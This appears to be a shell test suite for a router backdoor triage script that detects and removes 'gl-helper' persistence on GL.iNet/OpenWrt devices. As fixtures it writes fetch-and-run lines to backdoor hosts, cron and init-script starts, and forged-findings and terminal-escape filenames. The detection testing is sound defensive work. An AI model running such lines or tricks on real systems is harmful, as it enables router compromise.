echo "=== rc.local with only the firmware's own lines is not a change"
D=$(mkscen rcl "$OWL"); U=$D/u
mkdir -p "$U/etc"
printf '# Put your custom commands here\n\n  . /lib/functions/gl_util.sh\n  remount_ubifs\n\nexit 0\n' >"$U/etc/rc.local"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "gl_util.sh and remount_ubifs = INFO, no PERSIST, exit 0" '[ $rc = 0 ] && grep -q "INFO  *firmware-lines  */etc/rc.local" "$D/check.txt" && grep -q "PERSIST=0" "$D/check.txt"'
echo '/root/mine.sh &' >>"$D/m/etc/rc.local"
run "$D" "$OWL" --check >"$D/check.txt"
expect "one more line of the owner's makes it PERSIST again" 'grep -q "PERSIST  *persistence  */etc/rc.local" "$D/check.txt"'
umount "$D/m"

echo "=== Tailscale from the community updater is waved through"
OWS=$BASE/openwrt-rom-ts2
cp -a "$OWL" "$OWS"; mkdir -p "$OWS/usr/sbin"; echo stock-d >"$OWS/usr/sbin/tailscaled"; echo stock-c >"$OWS/usr/sbin/tailscale"; printf '/etc/config/x\n' >"$OWS/etc/sysupgrade.conf"
D=$(mkscen tsown "$OWS"); U=$D/u
mkdir -p "$U/usr/sbin"
mnt "$D" "$OWS"
rm "$D/m/usr/sbin/tailscale" "$D/m/usr/sbin/tailscaled"; printf 'ELF 1.104.7-tcbc74fe48-tiny.by.admon.1463 more\n' >"$D/m/usr/sbin/tailscaled"; ln -s /usr/sbin/tailscaled "$D/m/usr/sbin/tailscale"
run "$D" "$OWS" --check >"$D/check.txt"; rc=$?
expect "the uncompressed build is recognized by its version string: INFO for both files" '[ $rc = 0 ] && grep -q "INFO  *updater-file  */usr/sbin/tailscaled" "$D/check.txt" && grep -q "INFO  *updater-file  */usr/sbin/tailscale$" "$D/check.txt" && ! grep -q "REVIEW.*tailscale" "$D/check.txt"'
printf 'ELF UPX! packed\n' >"$D/m/usr/sbin/tailscaled"
run "$D" "$OWS" --check >"$D/check.txt"
expect "a compressed build without the updater's traces stays REVIEW" 'grep -q "REVIEW  *modified-binary  */usr/sbin/tailscaled" "$D/check.txt"'
printf '/etc/config/x\n/usr/sbin/tailscale\n/usr/sbin/tailscaled\n' >"$D/m/etc/sysupgrade.conf"
run "$D" "$OWS" --check >"$D/check.txt"
expect "a compressed build with the updater's traces is INFO" 'grep -A1 "INFO  *updater-file  */usr/sbin/tailscaled" "$D/check.txt" | grep -q "compressed build"'
printf 'ELF something else\n' >"$D/m/usr/sbin/tailscaled"
run "$D" "$OWS" --check >"$D/check.txt"
expect "another program at that path is not waved through" 'grep -q "REVIEW  *modified-binary  */usr/sbin/tailscaled" "$D/check.txt" && ! grep -q "updater-file" "$D/check.txt"'
umount "$D/m"

echo "=== fixes from the reports: KVM netstat link alone, Tailscale in /usr/bin, linked rc.local, WireGuard timing"
OWK=$BASE/kvm-like
cp -a "$OWL" "$OWK"; mkdir -p "$OWK/usr/bin" "$OWK/etc/defaults"; ln -s busybox "$OWK/usr/bin/netstat" 2>/dev/null; echo stock >"$OWK/usr/bin/tailscaled"
printf '# stock\nexit 0\n' >"$OWK/etc/defaults/rc.local"; rm -f "$OWK/etc/rc.local"; ln -s defaults/rc.local "$OWK/etc/rc.local"
D=$(mkscen kvmfix "$OWK"); U=$D/u
mnt "$D" "$OWK"
rm "$D/m/usr/bin/netstat"; ln -s /bin/busybox "$D/m/usr/bin/netstat"
printf 'ELF 1.104.7-tiny.by.admon.1463\n' >"$D/m/usr/bin/tailscaled"
run "$D" "$OWK" --check >"$D/check.txt"; rc=$?
expect "where GoodCloud cannot be read the advice is given all the same" 'grep -q "Switch GoodCloud and AstroWarp off now" "$D/check.txt" && grep -q "could not be read" "$D/check.txt"'
expect "the netstat link alone: IOC, verdict ATTACKED by the installer, exit 1" '[ $rc = 1 ] && grep -q "IOC  *installer-trace  */usr/bin/netstat" "$D/check.txt" && grep -q "Verdict: ATTACKED - the malware.s installer" "$D/check.txt"'
expect "the updater's Tailscale in /usr/bin is waved through" 'grep -q "INFO  *updater-file  */usr/bin/tailscaled" "$D/check.txt"'
expect "an rc.local that is a link to a regular file is not called odd" '! grep -q "odd-file" "$D/check.txt"'
run "$D" "$OWK" --fix >"$D/fix.txt"; rc=$?
expect "--fix leaves the link, exits 1 and names no state file (issue 22)" '[ $rc = 1 ] && [ -L "$D/m/usr/bin/netstat" ] && grep -q "Nothing to remove for installer-trace" "$D/fix.txt" && ! grep -q "state file" "$D/fix.txt"'
umount "$D/m"
D=$(mkscen wg "$OWL"); U=$D/u
mkdir -p "$U/bin" "$U/etc/config"; printf '\033LuaQ loader\n' >"$U/bin/ulogd"; echo cfg >"$U/etc/config/wireguard_server"
touch -d '2025-12-19 21:07:07 UTC' "$U/bin/ulogd"; touch -d '2025-12-19 21:07:18 UTC' "$U/etc/config/wireguard_server"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
expect "WireGuard server config written seconds after the loader is noted" 'grep -A1 "REVIEW  *backdoor-wg  */etc/config/wireguard_server" "$D/check.txt" | grep -q "written 11 s after"'
umount "$D/m"

echo "=== the address of the result page carries the result as a nine-character code"
# Every code is read back with the page's own reader (worker/src/result.html), so the
# script and the page cannot drift apart. Needs node; without it these are skipped.
readcode() { # the code in a file of script output, line $2 of those that carry one -> "v p k g n f rv"
	node -e 'const fs = require("fs"), h = fs.readFileSync(process.argv[1], "utf8"), src = h.slice(h.indexOf("const B32 = "), h.indexOf("function read() {"));
		const { decode } = new Function(src + "; return { decode };")(), c = decode(process.argv[2]);
		console.log(c ? `v=${c.v} p=${c.p} k=${c.k.join(".")} g=${c.g} n=${c.n} f=${c.f} rv=${c.rv}` + (c.dev && c.dev.model ? ` dev=${c.dev.model}/${c.dev.ver.join(".")}/${c.dev.test ? "test" : "release"}` : "") : "invalid");' \
		"$(dirname "$T")/worker/src/result.html" "$(grep -o "$3/#[0-9A-Z-]*" "$1" | sed -n "${2}p" | sed 's/.*#//')"
}
D=$(mkscen link "$OWL")
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
grep -B1 'csa.gl-i.net/#' "$D/check.txt"
expect "the address is short: the host, a # and nine characters without I, L, O or U" 'grep -qE "^   >>> https://csa\.gl-i\.net/#[0-9A-HJKMNP-TV-Z]{9}$" "$D/check.txt"'
mkdir -p "$D/m/tmp" "$D/m/etc/config"; mkfifo "$D/m/tmp/f"; printf '#!/bin/sh\nmy-own-thing\n' >"$D/m/etc/rc.local"
printf "config cloud\n\toption enable '1'\n" >"$D/m/etc/config/gl-cloud"; printf 'x http://up.adguardns.org/\n' >"$D/m/etc/config/other"
run "$D" "$OWL" --check >"$D/check2.txt"
GL_TRIAGE_RESULT_URL=http://127.0.0.1/x/ run "$D" "$OWL" --fix >"$D/fix.txt"
if command -v node >/dev/null 2>&1; then
	V=$(sed -n 's/^VERSION=//p' "$T")
	expect "clean: this version, a router, no findings, GoodCloud not known" '[ "$(readcode "$D/check.txt" 1 csa.gl-i.net)" = "v=$V p=r k= g=x n=0 f=0 rv=0" ]'
	readcode "$D/check2.txt" 1 csa.gl-i.net
	expect "pipe, changed rc.local and a backdoor server: their kinds, GoodCloud on" '[ "$(readcode "$D/check2.txt" 1 csa.gl-i.net)" = "v=$V p=r k=pp.bh.pe g=1 n=0 f=0 rv=0" ]'
	expect "after --fix the address still names what was found, and says the fix is incomplete" '[ "$(readcode "$D/fix.txt" 1 127.0.0.1/x)" = "v=$V p=r k=pp.bh.pe g=1 n=0 f=3 rv=0" ]'
else
	echo "  SKIP: reading the codes back needs node"
fi
expect "the result with its address comes after the GoodCloud advice, the address right under the verdict" 'grep -A8 "Verdict:" "$D/check.txt" | grep -q "csa.gl-i.net/#" && [ "$(grep -n "^== GoodCloud" "$D/check.txt" | head -n 1 | cut -d: -f1)" -lt "$(grep -n "^== Result" "$D/check.txt" | head -n 1 | cut -d: -f1)" ] && [ "$(grep -c "^== GoodCloud" "$D/check.txt")" = 1 ]'
expect "on a device with traces the next steps follow the result" '[ "$(grep -n "^== Result" "$D/check2.txt" | head -n 1 | cut -d: -f1)" -lt "$(grep -n "^== Next steps" "$D/check2.txt" | head -n 1 | cut -d: -f1)" ]'
expect "with --fix the address is given once, under the verdict after the clean-up" '[ "$(grep -c "http://127.0.0.1/x/#" "$D/fix.txt")" = 1 ] && grep -A25 "^== Result after remediation" "$D/fix.txt" | grep -q "http://127.0.0.1/x/#" && [ "$(grep -c "^== GoodCloud" "$D/fix.txt")" = 1 ]'
# model and firmware: a second part of five characters, where both are known
mkdir -p "$D/m/tmp/sysinfo" "$D/m/etc"; echo 'GL.iNet GL-MT6000' >"$D/m/tmp/sysinfo/model"; echo 4.9.1 >"$D/m/etc/glversion"; echo release2 >"$D/m/etc/version.type"
run "$D" "$OWL" --check >"$D/check3.txt"
grep 'csa.gl-i.net/#' "$D/check3.txt"
expect "with model and firmware known the address has a second part, and says so" 'grep -qE "^   >>> https://csa\.gl-i\.net/#[0-9A-HJKMNP-TV-Z]{9}-[0-9A-HJKMNP-TV-Z]{5}$" "$D/check3.txt" && grep -q "the model and its firmware version" "$D/check3.txt"'
echo 4.11.0 >"$D/m/etc/glversion"; echo beta5 >"$D/m/etc/version.type"; echo mt3000 >"$D/m/tmp/sysinfo/model"
run "$D" "$OWL" --check >"$D/check4.txt"
echo 'Some Other Board' >"$D/m/tmp/sysinfo/model"
run "$D" "$OWL" --check >"$D/check5.txt"
echo mt6000 >"$D/m/tmp/sysinfo/model"; echo 3.216 >"$D/m/etc/glversion"
run "$D" "$OWL" --check >"$D/check6.txt"
if command -v node >/dev/null 2>&1; then
	expect "the second part reads back as the model and the version" 'readcode "$D/check3.txt" 1 csa.gl-i.net | grep -q " dev=mt6000/4.9.1/release$"'
	expect "a beta build is marked as a test build" 'readcode "$D/check4.txt" 1 csa.gl-i.net | grep -q " dev=mt3000/4.11.0/test$"'
fi
expect "an unknown model or a version that does not fit: the short address, as before" 'grep -qE "csa\.gl-i\.net/#[0-9A-HJKMNP-TV-Z]{9}$" "$D/check5.txt" && grep -qE "csa\.gl-i\.net/#[0-9A-HJKMNP-TV-Z]{9}$" "$D/check6.txt" && ! grep -q "the model and its firmware version" "$D/check5.txt"'
expect "nothing of a path or a name is in the address" '! grep "csa.gl-i.net/#" "$D/check2.txt" | grep -qi "rc.local\|adguard\|tmp"'
umount "$D/m"

echo "=== a copy of this script on the device is not a trace"
D=$(mkscen selfcopy "$OWL")
mnt "$D" "$OWL"
for d in etc/config etc/init.d etc/hotplug.d/iface etc/profile.d root; do mkdir -p "$D/m/$d"; cp "$T" "$D/m/$d/gl-helper-triage.sh"; done
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
expect "copies in /etc/config and in autostart places: REVIEW script-copy, exit 0, clean verdict" '[ $rc = 0 ] && grep -q "REVIEW  *script-copy  */etc/config/gl-helper-triage.sh" "$D/check.txt" && grep -q "REVIEW  *script-copy  */etc/init.d/gl-helper-triage.sh" "$D/check.txt" && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "Verdict: no gl-helper indicators found" "$D/check.txt"'
printf '#!/bin/sh\nwget http://cdn.adguardns.com/x\n' >"$D/m/etc/config/other.sh"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
expect "another file that names a server of the backdoor is still IOC" '[ $rc = 1 ] && grep -q "IOC  *backdoor-host  */etc/config/other.sh" "$D/check.txt"'
umount "$D/m"

echo "=== issue 25: the lines of a copy hide no start; names; a list of directories"
D=$(mkscen i25 "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d" "$U/etc/crontabs" "$U/etc/config"
# rc.local in the very shape of a copy: shell line, the name in line 4, VERSION, IOC_RE, BD_HOST_RE
printf '#!/bin/sh\n# x\n#\n# gl-helper-triage.sh - triage for x\nVERSION=9.9\nBD_HOST_RE=x\nIOC_RE=x\n/etc/config/.gl/gl-helper &\nexit 0\n' >"$U/etc/rc.local"
printf '#!/bin/sh\n# gl-helper-triage.sh - triage for x\nBD_HOST_RE=x\nIOC_RE=x\n/etc/glinet/.cache/eco.tmp &\n' >"$U/etc/init.d/fake-copy"
printf '*/3 * * * * /bin/sh /etc/glinet/.cache/.rk1\n' >"$U/etc/crontabs/root"
printf '/etc/my-own-file\n/userdata/.gl\n' >"$U/etc/sysupgrade.conf"
printf '#!/bin/sh\nDIRS="/etc/config/.gl /tmp/.gl"\nfor d in $DIRS; do rm -rf "$d"; done\n' >"$U/etc/init.d/my-cleanup"
printf '#!/bin/sh\nH=cdn.adguardns.com\nwget -qO- http://cdn.adguardns.com/x | sh\n' >"$U/etc/config/fetch.sh"
{ cat "$T"; printf 'wget -qO- http://cdn.adguardns.com/x | sh\n'; } >"$U/etc/config/gl-helper-triage.sh"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
expect "the lines of a copy in rc.local and an init script hide no start: IOC persist-ref" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/rc.local" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/fake-copy" "$D/check.txt" && ! grep -qE "script-copy  */etc/(rc.local|init.d/fake-copy)" "$D/check.txt"'
expect "a copy with a line that fetches from a backdoor server is IOC backdoor-host" 'grep -q "IOC  *backdoor-host  */etc/config/gl-helper-triage.sh" "$D/check.txt" && grep -q "IOC  *backdoor-host  */etc/config/fetch.sh" "$D/check.txt"'
expect ".rk1 in a crontab and /userdata/.gl without a slash in a keep list are IOC" 'grep -q "IOC  *persist-ref  */etc/crontabs/root" "$D/check.txt" && grep -q "IOC  *keep-ref  */etc/sysupgrade.conf" "$D/check.txt"'
expect "a variable that lists the directories starts nothing: REVIEW path-ref, no IOC" '! grep -q "IOC  *[a-z-]*  */etc/init.d/my-cleanup" "$D/check.txt" && grep -q "REVIEW  *path-ref  */etc/init.d/my-cleanup" "$D/check.txt"'
umount "$D/m"

echo "=== issue 25: no overlay and no base image"
NB=$BASE/nobase; mkdir -p "$NB/etc/init.d" "$NB/etc/hotplug.d/iface" "$NB/lib/upgrade/keep.d" "$NB/overlay/.gl" "$NB/userdata/.gl" "$NB/usr/lib/opkg/info" "$NB/out"
echo "DISTRIB_ID='OpenWrt'" >"$NB/etc/openwrt_release"
printf '#!/bin/sh\n/etc/config/.gl/gl-helper &\n' >"$NB/etc/init.d/S99x"
# owned by a package: without a base image that says nothing, it is read all the same
printf '/etc/init.d/S99x\n/etc/init.d/vendor-clean\n' >"$NB/usr/lib/opkg/info/base-files.list"
printf '#!/bin/sh\nwget -qO- http://66.245.219.252:8000/ni.sh | sh\n' >"$NB/etc/hotplug.d/iface/99-y"
printf '/etc/config/network\n/etc/config/.gl/\n' >"$NB/lib/upgrade/keep.d/z"
printf '#!/bin/sh\nrm -rf /etc/config/.gl /etc/glinet/.cache\n' >"$NB/etc/init.d/vendor-clean"
printf '#!/bin/sh\necho hi\n' >"$NB/etc/init.d/plain"
{ printf '\177ELF'; head -c 2000 /dev/zero | tr '\0' x; printf 'Node hardened executable packer; format NPK2'; } >"$NB/overlay/.gl/renamed"
echo note >"$NB/userdata/.gl/unknown"
triage --root "$NB" -o "$NB/out" --check >"$NB/check.txt" 2>&1; rc=$?
grep -E '^ +(IOC|REVIEW) |NOTE' "$NB/check.txt"
expect "without a base image autostart places are read: init script, hotplug, keep list are IOC" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/S99x" "$NB/check.txt" && grep -q "IOC  *persist-ref  */etc/hotplug.d/iface/99-y" "$NB/check.txt" && grep -q "IOC  *keep-ref  */lib/upgrade/keep.d/z" "$NB/check.txt"'
expect "the firmware's own clean-up and other files are not listed, and the note says why" '! grep -qE "/etc/init.d/(vendor-clean|plain)" "$NB/check.txt" && grep -q "NOTE: no overlay and no base image found" "$NB/check.txt"'
expect "the malware's directories outside the upper layer: a program by its packer is IOC, an unknown file REVIEW" 'grep -q "IOC  *marker  */overlay/.gl/renamed" "$NB/check.txt" && grep -q "REVIEW  *hidden-dir  */userdata/.gl" "$NB/check.txt"'
triage --root "$NB" -o "$NB/out" --fix >"$NB/fix.txt" 2>&1; rc=$?
expect "--fix without a base image takes out only the malware's lines and its directory" '[ $rc = 2 ] && [ ! -e "$NB/overlay/.gl" ] && ! grep -q /etc/config/.gl "$NB/etc/init.d/S99x" && ! grep -q 66.245 "$NB/etc/hotplug.d/iface/99-y" && grep -qx /etc/config/network "$NB/lib/upgrade/keep.d/z" && ! grep -q "\.gl" "$NB/lib/upgrade/keep.d/z" && [ -f "$NB/etc/init.d/vendor-clean" ]'

echo "=== issue 25: /tmp, the spool crontab, rtty_conf, the state file, a late netstat link"
D=$(mkscen i25b "$OWL"); U=$D/u
mkdir -p "$U/tmp/.wl" "$U/var/spool/cron/crontabs" "$U/etc/config" "$U/usr/bin"
: >"$U/tmp/.bt"; : >"$U/tmp/rc.local.bak"
printf '*/3 * * * * /etc/config/.gl/watch.sh\n0 4 * * * /usr/bin/mine\n' >"$U/var/spool/cron/crontabs/root"
printf '{"servers":["203.0.113.7"],"heartbeat":5,"timeout":0,"tls":false}\n' >"$U/etc/rtty_conf"
: >"$U/etc/mp_ip_mapping_info"; echo x >"$U/etc/mp_connection_info"; printf "config global 'global'\n\toption enable '0'\n" >"$U/etc/config/mptun"
touch -d '2026-11-21 10:00:00 UTC' "$U/etc/mp_ip_mapping_info" "$U/etc/mp_connection_info"
ln -s /bin/busybox "$U/usr/bin/netstat"
mnt "$D" "$OWL"
(unset GL_TRIAGE_ATTACK_UNTIL; run "$D" "$OWL" --check) >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|REVIEW) ' "$D/check.txt"
expect "names the installer leaves in /tmp are REVIEW tmp-file" 'for f in .bt .wl rc.local.bak; do grep -q "REVIEW  *tmp-file  */tmp/$f" "$D/check.txt" || exit 1; done'
expect "the watchdog in busybox crond's own crontab is IOC cron-ref" 'grep -q "IOC  *cron-ref  */var/spool/cron/crontabs/root" "$D/check.txt"'
expect "rtty_conf with another server is REVIEW and names it" 'grep -A1 "REVIEW  *rtty-conf  */etc/rtty_conf" "$D/check.txt" | grep -q "203.0.113.7" && ! grep -q "rtty-server" "$D/check.txt"'
expect "an empty state file written with the module's other state files is REVIEW, not cloud-command" 'grep -A1 "REVIEW  *state-file  */etc/mp_ip_mapping_info" "$D/check.txt" | grep -q "together with the SD-WAN module" && ! grep -q "cloud-command" "$D/check.txt"'
expect "a netstat link made after the attack is no installer-trace, it is listed for review" '! grep -q "installer-trace" "$D/check.txt" && grep -q "REVIEW  *new-link  */usr/bin/netstat" "$D/check.txt"'
run "$D" "$OWL" --fix >"$D/fix.txt"; rc=$?
expect "--fix takes the watchdog out of that crontab and keeps the owner's line" '[ $rc = 2 ] && ! grep -q watch.sh "$D/m/var/spool/cron/crontabs/root" && grep -q /usr/bin/mine "$D/m/var/spool/cron/crontabs/root"'
umount "$D/m"
rm "$U/etc/mp_connection_info"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"
expect "the same state file written on its own is still cloud-command" 'grep -q "IOC  *cloud-command  */etc/mp_ip_mapping_info" "$D/check.txt"'
umount "$D/m"
bash "$(dirname "$T")/triage-remote.sh" -p >"$BASE/tr.txt" 2>&1; rc=$?
expect "triage-remote.sh: -p without a value stops with exit 4" '[ $rc = 4 ] && grep -q "needs a value" "$BASE/tr.txt"'
bash "$(dirname "$T")/triage-remote.sh" root@192.0.2.1 -oProxyCommand=true >"$BASE/tr.txt" 2>&1; rc=$?
expect "triage-remote.sh: a device that starts with - is refused before ssh sees it (review of 2.55)" '[ $rc = 4 ] && grep -q "not a device: -oProxyCommand=true" "$BASE/tr.txt"'

echo "=== --changes: the files that differ from the base image, on request only"
D=$(mkscen chg "$OWL"); U=$D/u
mnt "$D" "$OWL"
echo 'new rules' >"$D/m/etc/rc.local"; echo openwrt >"$D/m/etc/hostname"; rm "$D/m/etc/init.d/dnsmasq"
mkdir -p "$D/m/etc/config"; echo mine >"$D/m/etc/config/wireless"; touch -d '2026-11-20 21:03:11 UTC' "$D/m/etc/config/wireless"
rm "$D/m/bin/netstat"; ln -s /tmp/n "$D/m/bin/netstat"
echo x >"$D/m/etc/esc$(printf '\033')[2Jname"; mkdir "$D/m/etc/a
b"; echo y >"$D/m/etc/a
b/in"
run "$D" "$OWL" --changes >"$D/chg.txt" 2>&1; rc=$?
cat "$D/chg.txt"
expect "--changes: new, changed and removed files with their time, unchanged copies left out" '[ $rc = 0 ] && grep -q "^changed  .*  /etc/rc.local$" "$D/chg.txt" && grep -q "^new      2026-11-20 21:03:11  /etc/config/wireless$" "$D/chg.txt" && grep -q "^removed  .*  /etc/init.d/dnsmasq$" "$D/chg.txt" && grep -q "^changed  .*  /bin/netstat -> /tmp/n$" "$D/chg.txt" && ! grep -q /etc/hostname "$D/chg.txt"'
expect "--changes: no escape from a file name reaches the screen, a name with a line break is listed" '! grep -q "$(printf "\033")" "$D/chg.txt" && grep -q "^new  .*/etc/esc?\[2Jname$" "$D/chg.txt" && grep -q "^odd-name .*/etc/a?b$" "$D/chg.txt" && grep -q "^# 2 new, 2 changed, 1 removed, 1 odd-name$" "$D/chg.txt"'
expect "--changes: no findings, no report, no archive" '! grep -qE "IOC|REVIEW|Verdict|report" "$D/chg.txt" && [ -z "$(ls "$D/out")" ]'
triage --root "$D/m" --upper "$U" -o "$D/out" --changes >"$D/chg2.txt" 2>&1; rc=$?
expect "--changes without a base image lists the overlay's files as written" '[ $rc = 0 ] && grep -q "^written  .*  /etc/hostname$" "$D/chg2.txt" && grep -q "^removed  .*  /etc/init.d/dnsmasq$" "$D/chg2.txt" && grep -q "no base image" "$D/chg2.txt"'
triage --root "$D/m" --lower "$OWL" -o "$D/out" --changes >"$D/chg3.txt" 2>&1; rc=$?
expect "--changes without an overlay compares the running system with the base image" '[ $rc = 0 ] && grep -q "^changed  .*  /etc/rc.local$" "$D/chg3.txt" && grep -q "^removed  .*  /etc/init.d/dnsmasq$" "$D/chg3.txt" && ! grep -q /etc/hostname "$D/chg3.txt"'
umount "$D/m"
triage --root "$NB" -o "$NB/out" --changes >"$BASE/chg4.txt" 2>&1; rc=$?
expect "--changes with neither says so and stops with exit 4" '[ $rc = 4 ] && grep -q "No list of changes" "$BASE/chg4.txt"'

echo "=== review of 2.55: forged findings, hidden starts, names that are patterns"
D=$(mkscen r255a "$OWL"); U=$D/u
mkdir -p "$U/usr/bin" "$U/etc/init.d" "$U/etc/profile.d" "$U/etc/rc.d" "$U/etc/config" "$U/lib/apk/db" "$BASE/r255victim"
echo secret >"$BASE/r255victim/secret.txt"
TAB=$(printf '\t')
# a link's target with a line break in it made findings lines of its own
ln -s "x
INFO${TAB}package-file${TAB}/etc/init.d/evil${TAB}installed by package base-files" "$U/usr/bin/foo"
ln -s "x
IOC${TAB}persist-ref${TAB}/../../r255victim/secret.txt${TAB}starts the malware (x)" "$U/usr/bin/bar"
ln -s "x
IOC${TAB}persist-ref${TAB}/${TAB}starts the malware (x)" "$U/usr/bin/baz"
printf '#!/bin/sh\n/etc/config/.gl/gl-helper &\n' >"$U/etc/init.d/evil"
# the shape of a copy of this script, and the header of compiled Lua, with a start behind it
{ printf '#!/bin/sh\n# gl-helper-triage.sh - triage\nVERSION=2.55\nIOC_RE=x\nBD_HOST_RE=x\n'; printf '/etc/config/.gl/gl-helper &\n'; } >"$U/etc/init.d/zz-copy"
{ printf '\033LuaQ\n/etc/config/.gl/gl-helper &\n'; head -c 1200 /dev/zero | tr '\0' '#'; echo; } >"$U/etc/init.d/yy-lua"
# a list of packages in the overlay that claims an init script
{ cat "$OWL/lib/apk/db/installed"; printf 'P:evilpkg\nF:etc/init.d\nR:pkgd\n\n'; } >"$U/lib/apk/db/installed"
printf '#!/bin/sh\n/etc/config/.gl/gl-helper &\n' >"$U/etc/init.d/pkgd"
# a name that is a pattern for another: b.sh starts the malware, bXsh does not
printf '/etc/config/.gl/gl-helper &\n' >"$U/etc/profile.d/b.sh"
printf 'true\n' >"$U/etc/profile.d/bXsh"
# names with a line break and with an escape sequence
printf '/etc/config/.gl/gl-helper &\n' >"$U/etc/profile.d/a
b.sh"
printf 'echo hello\n' >"$U/etc/profile.d/c
d.sh"
printf 'x\n' >"$U/etc/init.d/e$(printf '\033')[2Jf"
# a link into the malware's directory
ln -s /etc/config/.gl/boot.sh "$U/etc/rc.d/S98yy"
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|REVIEW|INFO) ' "$D/check.txt" | tr '\033' '~'
expect "a link target with a line break makes no findings line of its own" '[ $rc = 1 ] && grep -q "IOC  *persist-ref  */etc/init.d/evil" "$D/check.txt" && ! grep -q "INFO  *package-file  */etc/init.d/evil" "$D/check.txt" && ! grep -qE "^ +IOC  *persist-ref  *(/|/\.\./\.\./r255victim/secret\.txt) *$" "$D/check.txt"'
expect "the shape of a copy of this script or of compiled Lua hides no start, nor does a package that claims the file" 'grep -q "IOC  *persist-ref  */etc/init.d/zz-copy" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/yy-lua" "$D/check.txt" && grep -q "IOC  *persist-ref  */etc/init.d/pkgd" "$D/check.txt"'
expect "a name is no pattern: b.sh is IOC, bXsh only new" 'grep -q "IOC  *persist-ref  */etc/profile.d/b.sh" "$D/check.txt" && grep -q "REVIEW  *new  */etc/profile.d/bXsh" "$D/check.txt"'
expect "a name with a line break is read: what starts the malware is IOC, the other REVIEW odd-name" 'grep -q "IOC  *persist-ref  *?/etc/profile.d/a?b.sh" "$D/check.txt" && grep -q "REVIEW  *odd-name  *?/etc/profile.d/c?d.sh" "$D/check.txt" && ! grep -q "/etc/profile.d/a *$" "$D/check.txt"'
expect "no escape sequence reaches the screen" '! grep -q "$(printf "\033")" "$D/check.txt"'
expect "a link into the malware's directory is IOC persist-ref" 'grep -q "IOC  *persist-ref  */etc/rc.d/S98yy" "$D/check.txt"'
run "$D" "$OWL" --archive >"$D/arch.txt" 2>&1
expect "the archive holds nothing from outside the root" '[ -n "$(ls "$D"/out/*.tar.gz 2>/dev/null)" ] && ! tar -tzf "$(ls "$D"/out/*.tar.gz | head -n 1)" | grep -q secret'
run "$D" "$OWL" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
expect "--fix takes out the file with a line break that starts the malware, keeps the other and all outside the root" '[ ! -e "$D/m/etc/profile.d/a
b.sh" ] && [ -e "$D/m/etc/profile.d/c
d.sh" ] && [ -f "$BASE/r255victim/secret.txt" ] && [ -d "$D/m/etc/config" ] && [ -f "$D/m/etc/profile.d/bXsh" ] && [ -d "$D/m/usr" ]'
umount "$D/m"

echo "=== review of 2.55: an owner's guard is no start, and --fix leaves it"
D=$(mkscen r255b "$OWL"); U=$D/u
mkdir -p "$U/etc/init.d"
printf '# Put your custom commands here\nlogger -t guard "nothing found; gl-helper not running"\nwget -q --spider http://cdn.adguardns.com/ || logger "block holds"\nexit 0\n' >"$U/etc/rc.local"
cat >"$U/etc/init.d/cleanup" <<'X'
#!/bin/sh /etc/rc.common
START=99
PATHS="
/etc/glinet/.cache
/etc/config/.gl
"
start() {
	for p in $PATHS; do rm -rf "$p"; done
	cat <<NOTE
note: /etc/config/.gl removed
NOTE
}
X
mnt "$D" "$OWL"
run "$D" "$OWL" --check >"$D/check.txt"; rc=$?
grep -E '^ +(IOC|PERSIST|REVIEW|INFO) ' "$D/check.txt"
expect "a guard with ; in quotes, a list of paths over lines, a note and a probe start nothing (exit $rc)" '[ $rc = 0 ] && ! grep -qE "^ +IOC " "$D/check.txt" && grep -q "REVIEW  *path-ref  */etc/init.d/cleanup" "$D/check.txt"'
run "$D" "$OWL" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
expect "--fix changes none of them (exit $rc)" '[ $rc = 0 ] && grep -q "logger -t guard" "$D/m/etc/rc.local" && [ -f "$D/m/etc/init.d/cleanup" ]'
umount "$D/m"
D=$(mkscen r255c "$OWL"); U=$D/u
mkdir -p "$U/etc/config/.gl"
echo x >"$U/etc/config/.gl/gl-helper"
printf '# Put your custom commands here\n. /lib/functions/gl_util.sh\nremount_ubifs\nexit 0\n' >"$U/etc/rc.local"
mnt "$D" "$OWL"
run "$D" "$OWL" --fix --no-report >"$D/fix.txt" 2>&1; rc=$?
expect "--fix leaves an rc.local that has only the firmware's own lines (exit $rc)" '[ $rc = 2 ] && grep -q remount_ubifs "$D/m/etc/rc.local" && [ ! -e "$D/m/etc/config/.gl" ]'
umount "$D/m"

echo "=== review of 2.55: starts that 2.55 did not see"
D=$(mkscen r255d "$OWL"); U=$D/u
mkdir -p "$U/etc/crontabs" "$U/etc/hotplug.d/iface" "$U/etc/init.d"
printf '*/3 * * * * flock -n /tmp/.wl /etc/config/.gl/watch.sh >/dev/null 2>&1\n' >"$U/etc/crontabs/root"
printf '# Put your custom commands here\n: $(/etc/config/.gl/boot.sh)\nexit 0\n' >"$U/etc/rc.local"
printf '#!/bin/sh\nSRV=66.245.219.252\nPORT=8899\ncurl -fsS -o /tmp/n5 "http://$SRV:$PORT/n5" && chmod +x /tmp/n5 && /tmp/n5 &\n' >"$U/etc/hotplug.d/iface/99-net"
printf 'wget -qO- http://GL-INET.TOP:8899/w | sh\n' >"$U/etc/init.d/upper"
printf 'trap "/etc/config/.gl/gl-helper &" EXIT\n' >"$U/etc/init.d/trap"
printf 'echo x | xargs /etc/config/.gl/gl-helper\n' >"$U/etc/init.d/xargs"
printf 'find /tmp -name x -exec /etc/config/.gl/gl-helper {} \\;\n' >"$U/etc/init.d/find"
